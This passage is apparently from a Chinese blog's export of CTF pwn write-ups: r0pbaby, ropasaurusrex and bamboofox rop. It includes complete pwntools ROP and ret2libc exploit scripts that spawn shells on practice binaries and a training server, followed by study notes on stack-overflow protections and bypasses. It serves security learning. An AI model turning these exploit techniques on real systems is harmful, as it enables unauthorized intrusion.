alt="1566636062417"></p><p>可以看到，这里显示的libc地址显然与程序中输出的并不一样。至于原因嘛，程序中输出的libc的地址其实是指向libc的指针的地址</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566636188829.png" alt="验证"></p><p>然后我们再来看一下system的地址，输入<code>p system</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566636255068.png" alt="1566636255068"></p><p>可以看到这里的system地址与程序中输出的地址是相同的，说明程序中输出的system地址是正确的，而libc地址只是一个幌子，需要我们自己去寻找</p><p>由于程序开启了地址随机化（PIE），所以我们肯定不能使用上面找到的地址，程序每启动一次地址都会随之发生变化，只能靠偏移来计算libc基地址。用程序泄露输出的system地址减去libc中查到的system偏移地址就可以得到libc的基地址，这里我们会用到pwntools里的ELF模块</p><p>下面修改一下我们之前的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./r0pbaby&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;M&#x27;</span>]:</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sh.sendlineafter(&#x27;: &#x27;,&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;libc.so.6: &#x27;)</span></span><br><span class="line"><span class="comment"># libc_addr = sh.recvuntil(&#x27;\n&#x27;,drop = True)</span></span><br><span class="line"><span class="comment"># base = int(libc_addr,16)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;system: &#x27;</span>)</span><br><span class="line">system = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]system_addr: &#x27;</span> + system</span><br><span class="line">sys_addr = <span class="built_in">int</span>(system,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">base = sys_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="number">0x00000000001b3e9a</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh)</span><br><span class="line">pop_rdi = base + <span class="number">0x000000000002155f</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]pop_rdi: &#x27;</span> + <span class="built_in">hex</span>(pop_rdi)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;1024): &#x27;</span>,length)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>再次执行脚本</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566644789827.png" alt="1566644789827"></p><p>，，好像又失败了，程序再次在获得shell之前就被中断了</p><h2 id="再一次修改exp-彡-彡（终极）">再一次修改exp 彡(-_-;)彡（终极）</h2><p>这次的问题原因找了好久也没有什么头绪，最后决定一点点跟着程序走来看一下到底哪里出现了问题，为什么会获取不到shell</p><p>首先怀疑程序脚本没有使程序正确获取到shell，在脚本中添加gdb.attach()进行调试，不断<code>ni</code>执行下一条语句直到出现main函数的ret</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566646966994.png" alt="1566646966994"></p><p>从图中可以看出，脚本执行成功覆盖了栈上的数据，而且也是按照我们安排好的顺序排布的，但是却依然不能通过system函数执行获取shell，再继续执行程序查看</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566647192368.png" alt="1566647192368"></p><p><code>pop rdi</code>的调用是没有问题的，那么就继续往下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566647349326.png" alt="1566647349326"></p><p>可以看到字符串<code>/bin/sh</code>的地址也成功被存入rdi寄存器中，前面都没问题，那么问题一定出现在system函数上了，按下<code>c</code>让程序在gdb中继续运行直到它崩掉</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566647493312.png" alt="1566647493312"></p><p>然后可以看到程序在<code>&lt;do_system+1094&gt;</code>处崩溃被中断了，这里的<code>movaps XMMWORD PTR [rsp+0x40],xmm0</code>指令是要求<code>[rsp+0x40]</code>的值是16byte（0x10）对齐，否则会直接触发中断使程序崩掉</p><p>这里的解决办法就是修改我们的payload，使得程序执行时栈的地址发生变化，从而改变这里system函数中的rsp的值。具体方案是在payload中添加一个<code>ret</code></p><p>先找一下<code>ret</code>指令的偏移</p><p>OMG！！有点多……<img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566648110896.png" alt="1566648110896"></p><p>滑动鼠标从最上边开始找吧，</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566648384062.png" alt="1566648189565"></p><p>还好，老天还是比较眷顾我们的，把需要的gadget放到了第一个，那么它的偏移就是<code>0x00000000000008aa</code></p><p>再来修改我们的exp，把ret添加进去~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./r0pbaby&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;M&#x27;</span>]:</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment"># sh.sendlineafter(&#x27;: &#x27;,&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;libc.so.6: &#x27;)</span></span><br><span class="line"><span class="comment"># libc_addr = sh.recvuntil(&#x27;\n&#x27;,drop = True)</span></span><br><span class="line"><span class="comment"># base = int(libc_addr,16)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;system: &#x27;</span>)</span><br><span class="line">system = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]system_addr: &#x27;</span> + system</span><br><span class="line">sys_addr = <span class="built_in">int</span>(system,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">base = sys_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="number">0x00000000001b3e9a</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh)</span><br><span class="line">pop_rdi = base + <span class="number">0x000000000002155f</span></span><br><span class="line">ret = base + <span class="number">0x00000000000008aa</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]pop_rdi: &#x27;</span> + <span class="built_in">hex</span>(pop_rdi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh2sys_off = 0x164a5a</span></span><br><span class="line"><span class="comment"># system2libc_off = 0x4f440</span></span><br><span class="line"><span class="comment"># pop_rdi2libc_off = 0x2155f</span></span><br><span class="line"><span class="comment"># binsh_addr = sys_addr + binsh2sys_off</span></span><br><span class="line"><span class="comment"># pop_rdi_addr = sys_addr - system2libc_off + pop_rdi2libc_off</span></span><br><span class="line"><span class="comment"># payload = flat([&#x27;a&#x27;*8,pop_rdi_addr,binsh_addr,sys_addr])</span></span><br><span class="line"><span class="comment"># print &quot;[*]binsh_addr: &quot; + hex(binsh_addr)</span></span><br><span class="line"><span class="comment"># print &quot;[*]pop_rdi_addr: &quot; + hex(pop_rdi_addr)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;1024): &#x27;</span>,length)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>在执行一次，</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566648384062.png" alt="1566648384062"></p><p>OK，大功告成，终于获得了我们心心念想的shell</p><p>在这里要感谢一下Ex大佬提供的解决思路 ~ ~ （传送门）-&gt;<a href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题</a></p><p>另外再推荐一个这道题比较有趣的解题视频：<a href="https://www.youtube.com/watch?v=uWPSBqXXB0Y">https://www.youtube.com/watch?v=uWPSBqXXB0Y</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题记录——2013-PlaidCTF-ropasaurusrex</title>
      <link href="/posts/515f1093.html"/>
      <url>/posts/515f1093.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于CTF-Wiki练习，下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/rop/2013-PlaidCTF-ropasaurusrex/ropasaurusrex">程序</a> | <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/rop/2013-PlaidCTF-ropasaurusrex/libc.so">libc</a></p></blockquote><p>拿到题目先检查程序保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566196676812.png" alt="1566196676812"></p><p>扔到IDA里面查看，程序在主函数里面调用了一个子函数，双击进入子函数可以看到我们熟悉的read溢出漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566196882838.png" alt="1566196882838"></p><p>先来找一下溢出的需要的偏移量，随机生成200个有序的字符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 200</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566197455403.png" alt="1566197455403"></p><p>将生成的字符串复制，使用gdb对程序进行运行调试，在程序等待输入的时候，把生成的随机字符串输入进去</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566197574056.png" alt="1566197574056"></p><p>然后可以得到程序溢出报错的地址<code>0x6261616b</code>，再次使用<code>cyclic</code>可以得到程序溢出所需要的偏移量为140</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566197574056.png" alt="1566197694547"></p><p>根据题目名称和所给的libc盲猜是ret2libc的题目</p><p>大体思路如下：</p><ul><li>首先根据程序源码的结构，我们要利用write函数将程序已经执行过的函数（比如read）地址泄露出来，然后再控制程序返回到含有溢出漏洞的函数，以便下一步溢出到system</li><li>根据泄露的函数的真实地址计算得到在libc中的基地址</li><li>利用基地址在libc中找到system和/bin/sh的地址，最后在payload中拼接打入程序即可</li></ul><p>下面就可以编写我们的exp的，在写之前，我们还需要找一下程序中溢出函数的地址</p><p>打开IDA，在main函数中找到溢出的函数，双击它</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566215173014.png" alt="1566215173014"></p><p>然后按<code>Tab</code>键切回到汇编代码的亚子</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566215243689.png" alt="1566215243689"></p><p>这里就是我们溢出函数的代码，可以看到它的起始地址为0x080483F4</p><p>下面正式编写我们的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">rop_libc = ELF(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fun = <span class="number">0x080483F4</span></span><br><span class="line">write_plt = rop_libc.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = rop_libc.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>,write_plt,fun,<span class="number">1</span>,read_got,<span class="number">4</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">read_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>,system,<span class="string">&#x27;bbbb&#x27;</span>,binsh])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题记录——train.cs.nctu.edu.tw: rop</title>
      <link href="/posts/4727b461.html"/>
      <url>/posts/4727b461.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天来做一下<code>train.cs.nctu.edu.tw: rop</code>，题目来自于CTF-Wiki的练习题，是bamboofox的入门练习题，<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/4">题目地址</a></p></blockquote><h2 id="题目分析-4">题目分析</h2><p>打开题目发现没有任何文件可供下载查看，只有一个远程连接的地址，这根我们之前做的PWN题目都不太一样，莫得办法，nc连上先看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc bamboofox.cs.nctu.edu.tw 10001</span><br></pre></td></tr></table></figure><p>连接上之后，屏幕里刷刷刷出来一大片（要刷屏的节奏？？！！）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566026309029.png" alt="1566026309029"></p><p>再仔细一看题目要求，这是给了我们14个gadgets，然后让我们按照一定的顺序排列，使得这些gadgets能够组合成一段可以完整执行的程序从而获得shell或者flag</p><p>对于我这样一个小萌新来说，看到这个题目真的是一筹莫展，第0段gadget提供了<code>int 80h</code>功能调用，由此自然而然地想到了使用系统调用<code>execve(&quot;/bin/sh&quot;,0,0)</code>来获得shell，下面就要进行拼凑辣。</p><h2 id="大概思路">大概思路</h2><p>先找一下大概的拼凑思路：</p><ul><li><p>要调用<code>execve()</code>，我们需要查一下<a href="http://syscalls.kernelgrok.com/">系统调用表</a></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566035429180.png" alt="1566035429180"></p></li><li><p>根据系统调用表我们可以看到，<code>execve()</code>的系统调用号为11，即0xb，储存在<code>eax</code>寄存器中。它的三个参数从左到右分别对应着<code>ebx</code>、<code>ecx</code>和<code>edx</code>，所以我们的目的是把字符串<code>/bin/sh</code>的地址放到ebx中，ecx和edx里面的值为0 。</p></li><li><p>对于<code>/bin/sh</code>这个参数，看了又看想了又想，也没找到这个参数该从哪里来，莫不是第10和11条的地址指向的是<code>/bin/sh</code>这个字符串？</p></li></ul><p>--------------------沉寂了一天……---------------------</p><ul><li><p>再仔细观察那两段神似地址的gadgets，终于发现了一点儿猫腻，这个似乎并不是地址，而是字符串ASCII的16进制形式，转码后发现，果然是字符串</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566033496802.png" alt="1566033496802"></p><p>第10段gadget对应的是<code>//bin/sh</code>，第11段对应的是<code>/home//ctf//flag</code>，这个正好对应着我们题目的flag路径。我们需要的<code>/bin/sh</code>因为push操作被压入了栈中，所以ebx的内容应该是字符串所在栈的地址。</p></li></ul><h2 id="具体实现">具体实现</h2><p>有了大概的思路，接下来我们一点一点具体实现一下</p><ul><li>先从字符串<code>/bin/sh</code>下手，把<code>/bin/sh</code>压入栈中之后，我们需要把栈所对应的地址也压入栈中，而栈的地址由esp所指向，所以我们要让esp也压入栈中。此时，代码序列为 <code>10,9</code></li><li>字符串的地址在栈中保存下来了，那么接下来我们要把地址转移到ebx寄存器中，需要恰好pop两次并且第二次是pop ebx，浏览所有可用的gadgets之后，可以使用两次第3个代码片段来达到目的。此时，代码序列为 <code>10,9,3,3</code></li><li>上一步使用的第3个gadget里面存在有<code>mov edx,eax</code>，所以我们可以借此机会，在此之前对eax清零，从而对edx实现置零。以上代码的顺序都是精心设计好的，没法进行增改，所以我们在字符串地址压栈之前对eax清零，选择第1个gadget，而这个gadget里面存在两个pop语句，为了堆栈平衡，需要再在前面添加两个无关紧要的push语句（随便两个push就可以）。此时的代码序列可以是<code>9,1,10,9,3,3</code>。</li><li>另外，在字符串所在栈之前，我们还需要至少空出一个栈空间，用来把字符串所在栈和之前的栈分隔开，避免产生字符串合并的情况（比如我们用的<code>/bin/sh</code>占用两个栈空间，如果在此之前的栈空间也是可以转换成字符串的数据就会造成<code>/bin/sh\001</code>这种类似的结果，这样是没法作为参数正确指向shell的），对于可用的gadgets中，我们可以使用第9个gadget通过把地址压栈进行隔离。这样，我们的代码序列目前就变成了<code>9,9,1,10,9,3,3</code></li><li>还剩下eax、ecx这两个寄存器，先来解决eax，最终的结果需要eax=11（0xb）。所给的gadgets中，有对eax进行累加的片段，但每次只能+2，而我们所要得到的11是奇数，所以需要eax的初始值为奇数。可以使用第12个gadget来完成，先把1和2压栈，然后再把压进去的2和1弹出来，需要满足恰好两句pop，且第二次pop是pop eax，第4个gadget是符合条件的。得到eax=1之后，就可以使用5次<code>add eax,0x2</code>把eax加到11即我们想要的结果。此时的代码序列为 <code>9,9,1,10,9,3,3,12,4,8,8,8,8,8</code></li><li>还剩下一个ecx，在上一步的操作中，使用的第4个gadget中包含<code>pop ecx</code>，使得ecx的值变成了2，这不是我们所期望的，所以需要再将其变成0。在eax还是1的时候，我们可以使用两次第2个gadget使得ecx减为0，但是这个gadget里面还带有没有用的<code>pop ebp</code>，这并不是我们想要的，但为了堆栈平衡，还需要把它抵消掉，在此之前随便再添加两句push（这里我选择了第12个gadget）。这时候我们的代码序列为 <code>9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8</code></li><li>到此为止我们执行execve()所需要的所有参数和寄存器的值都已经给安排明白了，接下来就要执行int 80h功能调用了。最终的代码序列为 <code>9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0</code></li></ul><p>对于程序执行，我们可以直接在程序中输入我们安排好的代码序列，也可以编写exp脚本远程执行代码，都可以正确的获得shell</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566048802071.png" alt="1566048802071"></p><p>执行后，可以获得flag为 <code>BAMBOOFOX&#123;return_oriented_programming_is_easy!&#125;</code></p><p>再附上exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="还有一种思路……">还有一种思路……</h2><p>后来在网上搜索这道题的时候，偶然发现了一位大佬的解题方式，他根据给定的gadgets组合出了三个系统调用，</p><p>控制程序直接输出了flag，没有借助于shell。</p><p>具体思路如下：</p><blockquote><p>open -&gt; read -&gt; write<br>open “/home/rop/flag”<br>open return file fd<br>read file fd to buffer<br>write buffer to STDOUT</p></blockquote><p>大佬的payload是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;1,13,13,11,9,7,7,12,4,2,2,8,8,0,12,13,1,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,13,9,6,9,13,4,4,8,12,12,12,12,12,0,9,12,3,1,8,8,0&quot;</span></span><br></pre></td></tr></table></figure><p>emmm ,有一丢丢长。这种方法虽然麻烦，但也不失为一种很好的思路，值得借鉴。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出漏洞利用技术学习笔记</title>
      <link href="/posts/c9e30e9d.html"/>
      <url>/posts/c9e30e9d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>听i春秋上面蓝莲花战队成员Atum的课程 <a href="https://www.ichunqiu.com/course/57493">CTF PWN选手的养成</a> ，了解到不少东西，在此记个笔记~</p></blockquote><h2 id="基础知识">基础知识</h2><blockquote><p>栈的结构：先进后出，在内存中为高地址往低地址增长，栈顶为栈的最上方（低地址区），栈底为栈的最下方（高地址区）</p></blockquote><h3 id="一、寄存器">一、寄存器</h3><ol><li><p>rsp/esp：指向栈顶的栈指针寄存器（低地址）</p></li><li><p>rbp/ebp：指向栈底的指针寄存器（高地址）。栈低通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址</p><p>栈的结构如图所示（栈由高地址向低地址增长）<br><a href="https://www.k2zone.cn/?p=1911">函数调用时栈的变化</a><br><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/a9f6379271.png" alt=""><br>EBP指向的栈底，ESP指向的栈顶，EBP下面的EIP是函数返回的地址（即return执行后下一条指令的地址），var1是函数的参数.</p></li><li><p>pc：程序指针，存储着指向CPU接下来要执行的指令地址</p></li><li><p>rdi rsi rdx rcx：x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p></li></ol><h3 id="二、栈溢出漏洞介绍">二、栈溢出漏洞介绍</h3><p>通俗的讲，栈溢出的原理就是不顾堆栈中分配的局部数据块大小，向该数据快写入了过多的数据，导致数据越界，结果覆盖来看老的堆栈数据。<br><a href="https://blog.csdn.net/aemperor/article/details/47310593">栈溢出漏洞的形式</a></p><h3 id="三、函数调用约定">三、函数调用约定</h3><p>函数调用: call, ret<br>调用约定： _stdcall, cdecl, fastcall, thiscall, nakedcall, __pascal<br>参数传递：取决于调用约定，x86默认从右向左，x64优先寄存器，然后用栈<br>call func -&gt; push pc, jmp func<br>leave -&gt; mov esp, ebp, pop ebp<br>ret -&gt; pop pc</p><h3 id="四、栈溢出的保护机制">四、栈溢出的保护机制</h3><h5 id="栈上的数据无法被当成指令来执行">栈上的数据无法被当成指令来执行</h5><p>数据执行保护（NX/DEP），将数据和代码区分开，让数据不可以当做代码来执行<br>绕过方法：ROP</p><h5 id="让攻击者难以找到shellcode地址">让攻击者难以找到shellcode地址</h5><p>地址空间布局随机化（ASLR、PIE）<br>绕过方法：infoleak 、ret2dlresolve 、ROP</p><h5 id="检测Stack-Overflow">检测Stack Overflow</h5><p>Stack Canary/Cookie，相当于在返回地址和ebp之间加一个cookies，通过检测cookies是否被改变<br>绕过方法：infoleak</p><h3 id="五、栈溢出的利用方法">五、栈溢出的利用方法</h3><p>现代栈溢出的技术基础：ROP(绕过NX和ASLR)<br>利用signal机制的ROP技术：SROP<br>没有binary怎么办：BROP(不是很常见)<br>劫持栈指针：stack pivot     //将栈指针劫持到其他区域<br>利用动态链接绕过ASLR：ret2dlresolve、fake linkmap<br>利用地址低12bit绕过ASLR：Partial Overwrite（低12位不会被随机化）<br>绕过Stack canary：改写指针与局部白能量、leak canary、overwrite canary<br>溢出位数不够怎么办：覆盖ebp,Partial Overwrite</p><h3 id="六、现代栈溢出的利用技术">六、现代栈溢出的利用技术</h3><h4 id="ROP">ROP</h4><hr><p>eg: Ret2libc<br>一种代码复用技术，通过控制栈调用来劫持控制流<br><strong>主要思想：</strong> 在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。<br>CTF中ROP常规套路<br>第一次触发漏洞，通过ROP泄露libc的address(如puts_got)，计算system地址 然后返回到一个可以重现触发漏洞的地方（main）再次触发漏洞。通过ROP调用system(‘/bin/sh’)直接execve(“/bin/sh”,[“/bin/sh”],NULL) 这个通常在静态链接比较常用</p><blockquote><p>Defcon 2015 Qual：R0pbaby <br>AliCTF 2016：vss<br>PlaidCTF  2013：ropasaurusrex</p></blockquote><h4 id="利用signal机制的ROP技术-SROP">利用signal机制的ROP技术-SROP</h4><hr><p>SROP（Sigretum Oriented Programming）<br>系统Signal Dispatch之前会将所有寄存器压栈，然后调用signal handler, signal handler返回时会将栈内容还原<br>如果事先填充栈，然后直接调用signal handler，那在返回的时候就可以控制寄存器的值资源</p><blockquote><p><a href="http://angelboy.logdown.com/posts/283221-srop">http://angelboy.logdown.com/posts/283221-srop</a><br><a href="http://www.2cto.com/article/201512/452080.html">http://www.2cto.com/article/201512/452080.html</a><br>defcon 2015 qualifier: fuckup（较难）</p></blockquote><h4 